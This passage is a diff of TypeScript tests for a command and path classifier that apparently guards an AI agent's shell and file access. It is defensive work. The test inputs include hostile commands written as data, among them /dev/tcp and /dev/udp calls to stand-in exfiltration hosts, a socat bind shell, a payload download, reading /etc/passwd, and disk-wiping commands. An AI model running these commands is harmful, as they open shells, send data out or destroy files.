@@ -27,7 +27,7 @@ describe("EnforcementGate path classification", () => {
     expect(result.capabilities.length).toBeGreaterThan(0)
 
     // The primary capability is file_read — an inside-workspace read
-    const primary = result.capabilities.find((c: any) => c.class === "file_read")
+    const primary = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(primary).toBeDefined()
     expect(primary.nonBypassable).toBe(false)
   })
@@ -44,7 +44,7 @@ describe("EnforcementGate path classification", () => {
       filePath: "/Users/test/synergy/src/index.ts",
     })
 
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeDefined()
     expect(external.nonBypassable).toBe(true)
   })
@@ -59,7 +59,7 @@ describe("EnforcementGate path classification", () => {
       filePath: "/Users/test/.ssh/id_rsa",
     })
 
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeDefined()
     expect(external.nonBypassable).toBe(true)
   })
@@ -74,7 +74,7 @@ describe("EnforcementGate path classification", () => {
       filePath: "/Users/test/synergy-control-profile/src/app.ts",
     })
 
-    const primary = result.capabilities.find((c: any) => c.class === "file_write")
+    const primary = result.capabilities.find((c: any) => c.class === "file_write")!
     expect(primary).toBeDefined()
     // Inside workspace write is not nonBypassable by itself
     expect(primary.nonBypassable).toBe(false)
@@ -90,7 +90,7 @@ describe("EnforcementGate path classification", () => {
       filePath: "/tmp/output.log",
     })
 
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeDefined()
     expect(external.nonBypassable).toBe(true)
   })
@@ -105,7 +105,7 @@ describe("EnforcementGate path classification", () => {
       input: "[/tmp/output.log#A1B2]\nSWAP 1..1:\n+updated\n",
     })
 
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeDefined()
     expect(external.nonBypassable).toBe(true)
   })
@@ -120,7 +120,7 @@ describe("EnforcementGate path classification", () => {
       input: "[/tmp/data.log#1a2b]\nSWAP 1..1:\n+updated\n",
     })
 
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeDefined()
     expect(external.nonBypassable).toBe(true)
   })
@@ -157,7 +157,7 @@ describe("EnforcementGate shell classification", () => {
       workdir: "/Users/test/synergy-control-profile",
     })
 
-    const shell = result.capabilities.find((c: any) => c.class === "shell_read")
+    const shell = result.capabilities.find((c: any) => c.class === "shell_read")!
     expect(shell).toBeDefined()
   })
 
@@ -172,7 +172,7 @@ describe("EnforcementGate shell classification", () => {
       workdir: "/Users/test/synergy-control-profile",
     })
 
-    const shell = result.capabilities.find((c: any) => c.class === "shell")
+    const shell = result.capabilities.find((c: any) => c.class === "shell")!
     expect(shell).toBeDefined()
   })
 
@@ -202,7 +202,7 @@ describe("EnforcementGate shell classification", () => {
       command: "rm -rf node_modules",
     })
 
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
     expect(destructive.nonBypassable).toBe(true)
   })
@@ -217,10 +217,10 @@ describe("EnforcementGate shell classification", () => {
       command: "rm -rf /etc/config",
     })
 
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
 
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeDefined()
   })
 
@@ -234,7 +234,7 @@ describe("EnforcementGate shell classification", () => {
       command: "cat /etc/passwd",
     })
 
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeDefined()
     expect(external.nonBypassable).toBe(true)
     expect(external.paths).toContain("/etc/passwd")
@@ -254,7 +254,7 @@ describe("isDestructive boundary correctness", () => {
 
     const result = gate.classify("bash", { command: "rm -rf node_modules" })
 
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
     expect(destructive.nonBypassable).toBe(true)
   })
@@ -267,7 +267,7 @@ describe("isDestructive boundary correctness", () => {
 
     const result = gate.classify("bash", { command: "sudo make install" })
 
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
     expect(destructive.nonBypassable).toBe(true)
   })
@@ -280,7 +280,7 @@ describe("isDestructive boundary correctness", () => {
 
     const result = gate.classify("bash", { command: "dd if=/dev/zero of=foo" })
 
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
     expect(destructive.nonBypassable).toBe(true)
   })
@@ -294,7 +294,7 @@ describe("isDestructive boundary correctness", () => {
 
     const result = gate.classify("bash", { command: "RM -RF node_modules" })
 
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
     expect(destructive.nonBypassable).toBe(true)
   })
@@ -307,7 +307,7 @@ describe("isDestructive boundary correctness", () => {
 
     const result = gate.classify("bash", { command: "SUDO make install" })
 
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
     expect(destructive.nonBypassable).toBe(true)
   })
@@ -320,7 +320,7 @@ describe("isDestructive boundary correctness", () => {
 
     const result = gate.classify("bash", { command: "DD if=/dev/zero of=foo" })
 
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
     expect(destructive.nonBypassable).toBe(true)
   })
@@ -334,10 +334,10 @@ describe("isDestructive boundary correctness", () => {
 
     const result = gate.classify("bash", { command: "git add file.ts" })
 
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeUndefined()
 
-    const shell = result.capabilities.find((c: any) => c.class === "shell")
+    const shell = result.capabilities.find((c: any) => c.class === "shell")!
     expect(shell).toBeDefined()
   })
 
@@ -349,10 +349,10 @@ describe("isDestructive boundary correctness", () => {
 
     const result = gate.classify("bash", { command: "bun add react" })
 
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeUndefined()
 
-    const shell = result.capabilities.find((c: any) => c.class === "shell")
+    const shell = result.capabilities.find((c: any) => c.class === "shell")!
     expect(shell).toBeDefined()
   })
 
@@ -364,10 +364,10 @@ describe("isDestructive boundary correctness", () => {
 
     const result = gate.classify("bash", { command: "echo add foo" })
 
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeUndefined()
 
-    const shell = result.capabilities.find((c: any) => c.class === "shell")
+    const shell = result.capabilities.find((c: any) => c.class === "shell")!
     expect(shell).toBeDefined()
   })
 
@@ -379,10 +379,10 @@ describe("isDestructive boundary correctness", () => {
 
     const result = gate.classify("bash", { command: "echo padded output" })
 
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeUndefined()
 
-    const shell = result.capabilities.find((c: any) => c.class === "shell")
+    const shell = result.capabilities.find((c: any) => c.class === "shell")!
     expect(shell).toBeDefined()
   })
 
@@ -394,10 +394,10 @@ describe("isDestructive boundary correctness", () => {
 
     const result = gate.classify("bash", { command: "git commit -m add" })
 
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeUndefined()
 
-    const shell = result.capabilities.find((c: any) => c.class === "shell")
+    const shell = result.capabilities.find((c: any) => c.class === "shell")!
     expect(shell).toBeDefined()
   })
 
@@ -409,10 +409,10 @@ describe("isDestructive boundary correctness", () => {
 
     const result = gate.classify("bash", { command: "bun run add-stamp" })
 
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeUndefined()
 
-    const shell = result.capabilities.find((c: any) => c.class === "shell")
+    const shell = result.capabilities.find((c: any) => c.class === "shell")!
     expect(shell).toBeDefined()
   })
 })
@@ -431,7 +431,7 @@ describe("EnforcementGate network classification", () => {
       url: "https://example.com/api/data",
     })
 
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 
@@ -925,10 +925,10 @@ describe("EnforcementGate readRoots", () => {
       filePath: "/Users/test/.synergy/config/synergy.jsonc",
     })
 
-    const ext = result.capabilities.find((c: any) => c.class === "file_external")
+    const ext = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(ext).toBeUndefined()
 
-    const read = result.capabilities.find((c: any) => c.class === "file_read")
+    const read = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(read).toBeDefined()
     expect(read.nonBypassable).toBe(false)
   })
@@ -974,11 +974,11 @@ describe("EnforcementGate readRoots", () => {
       filePath: "/Users/test/.synergy/config/synergy.jsonc",
     })
 
-    const ext = result.capabilities.find((c: any) => c.class === "file_external")
+    const ext = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(ext).toBeDefined()
     expect(ext.nonBypassable).toBe(true)
 
-    const read = result.capabilities.find((c: any) => c.class === "file_read")
+    const read = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(read).toBeUndefined()
   })
 
@@ -1039,7 +1039,7 @@ describe("EnforcementGate readRoots", () => {
       filePath: "/Users/test/.synergy/cache/models.json",
     })
 
-    const ext = result.capabilities.find((c: any) => c.class === "file_external")
+    const ext = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(ext).toBeUndefined()
   })
 
@@ -1069,7 +1069,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "rm -r dir" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
     expect(destructive.nonBypassable).toBe(true)
   })
@@ -1080,7 +1080,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "rm -f file" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1090,7 +1090,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "rmdir emptydir" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1100,7 +1100,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git reset --hard" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1110,7 +1110,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git clean -fd" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1120,7 +1120,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git push --force origin main" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1133,7 +1133,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git branch -D feature" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1143,7 +1143,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git rebase main" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1153,7 +1153,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git stash clear" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1163,7 +1163,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git stash drop" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1173,7 +1173,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git filter-branch --tree-filter" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1183,7 +1183,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git push --delete origin old-branch" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1193,7 +1193,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git push -f origin main" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1203,7 +1203,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git reflog expire --all" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1213,7 +1213,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git reflog delete HEAD@{1}" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1225,7 +1225,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "mkfs /dev/sda1" })
-    const hardline = result.capabilities.find((c: any) => c.class === "shell_hardline")
+    const hardline = result.capabilities.find((c: any) => c.class === "shell_hardline")!
     expect(hardline).toBeDefined()
     expect(hardline.nonBypassable).toBe(true)
   })
@@ -1236,7 +1236,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "fdisk /dev/sda" })
-    const hardline = result.capabilities.find((c: any) => c.class === "shell_hardline")
+    const hardline = result.capabilities.find((c: any) => c.class === "shell_hardline")!
     expect(hardline).toBeDefined()
     expect(hardline.nonBypassable).toBe(true)
   })
@@ -1248,8 +1248,8 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
     })
     const result = gate.classify("bash", { command: "lvremove vg0/lv1" })
     // May be caught as shell_hardline (hardline prefix) or fall through to shell_destructive
-    const hardline = result.capabilities.find((c: any) => c.class === "shell_hardline")
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const hardline = result.capabilities.find((c: any) => c.class === "shell_hardline")!
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(hardline || destructive).toBeDefined()
   })
 
@@ -1261,7 +1261,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git push" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1271,7 +1271,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git push origin main" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1281,7 +1281,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git -C /tmp push" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1291,7 +1291,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: 'bash -c "git push"' })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1301,7 +1301,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git pull --rebase" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1311,7 +1311,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git pull -r" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1321,7 +1321,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git revert HEAD" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1331,7 +1331,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git rm file.txt" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1341,7 +1341,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git commit --amend -m 'fix'" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1351,7 +1351,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git reset --soft HEAD~1" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1361,7 +1361,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git reset" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1371,7 +1371,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git restore file.ts" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1381,7 +1381,7 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git stash pop" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeDefined()
   })
 
@@ -1391,9 +1391,9 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git pull" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeUndefined()
-    const shell = result.capabilities.find((c: any) => c.class === "shell")
+    const shell = result.capabilities.find((c: any) => c.class === "shell")!
     expect(shell).toBeDefined()
   })
 
@@ -1403,9 +1403,9 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git restore --staged file.ts" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeUndefined()
-    const shell = result.capabilities.find((c: any) => c.class === "shell")
+    const shell = result.capabilities.find((c: any) => c.class === "shell")!
     expect(shell).toBeDefined()
   })
 
@@ -1415,9 +1415,9 @@ describe("EnforcementGate DESTRUCTIVE_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "git commit -m 'msg'" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeUndefined()
-    const shell = result.capabilities.find((c: any) => c.class === "shell")
+    const shell = result.capabilities.find((c: any) => c.class === "shell")!
     expect(shell).toBeDefined()
   })
 })
@@ -1432,7 +1432,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "echo > /dev/tcp/evil.com/80" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
     expect(net.nonBypassable).toBe(true)
   })
@@ -1443,7 +1443,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "cat /dev/udp/exfil.example.com/53" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 
@@ -1453,7 +1453,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "socat TCP-LISTEN:8080,fork EXEC:/bin/sh" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 
@@ -1463,7 +1463,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "ssh user@evil-server.com" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 
@@ -1473,7 +1473,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "dig example.com TXT" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 
@@ -1483,7 +1483,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "scp secret.txt host:/tmp/" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 
@@ -1493,7 +1493,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "rsync -avz dir/ user@host:/backup/" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 
@@ -1503,7 +1503,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "openssl s_client -connect example.com:443" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 
@@ -1513,7 +1513,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "pip install requests" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 
@@ -1523,7 +1523,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "nslookup example.com" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 
@@ -1533,7 +1533,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "ftp ftp.example.com" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 
@@ -1543,7 +1543,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "telnet evil.com 23" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 
@@ -1553,7 +1553,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "aria2c https://evil.com/payload.sh" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 
@@ -1563,7 +1563,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "gem install rails" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 
@@ -1573,7 +1573,7 @@ describe("EnforcementGate NETWORK_PATTERNS — expanded", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "cargo install ripgrep" })
-    const net = result.capabilities.find((c: any) => c.class === "network_request")
+    const net = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(net).toBeDefined()
   })
 })
@@ -1589,7 +1589,7 @@ describe("EnforcementGate path extraction — NON_PATH_PATTERNS", () => {
     })
     // A git commit message containing "POST /api" should not flag /POST as a filesystem path
     const result = gate.classify("bash", { command: "git commit -m 'POST /api'" })
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeUndefined()
   })
 
@@ -1599,7 +1599,7 @@ describe("EnforcementGate path extraction — NON_PATH_PATTERNS", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "echo /ab" })
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
